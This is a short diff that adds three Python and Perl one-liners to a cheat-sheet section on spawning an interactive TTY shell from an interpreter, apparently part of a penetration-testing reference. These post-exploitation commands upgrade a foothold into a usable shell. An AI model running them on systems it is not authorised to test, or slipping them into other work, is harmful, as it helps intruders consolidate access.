@@ -379,8 +379,11 @@ Spawn a TTY shell from an interpreter
 ```powershell
 /bin/sh -i
 python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
